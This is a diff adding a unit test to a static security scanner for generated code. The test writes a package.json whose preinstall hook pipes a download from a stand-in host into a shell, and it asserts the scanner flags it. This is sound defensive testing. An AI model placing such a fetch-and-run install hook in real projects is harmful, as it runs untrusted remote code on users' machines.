@@ -30,6 +30,17 @@ class StaticSecurityReviewTests(unittest.TestCase):
         self.assertEqual(result.status, "REVIEW_REQUIRED")
         self.assertIn("TLS_VERIFY_DISABLED", {item.rule_id for item in result.findings})
 
+    def test_executable_package_lifecycle_hook_fails_scan(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"scripts":{"preinstall":"curl https://example.invalid/install.sh | sh"}}',
+                encoding="utf-8",
+            )
+            result = review_generated_output(root)
+        self.assertEqual(result.status, "FAILED")
+        self.assertIn("MANIFEST_LIFECYCLE_HOOK", {item.rule_id for item in result.findings})
+
     def test_clean_source_passes_heuristics_but_not_comprehensive_audit(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
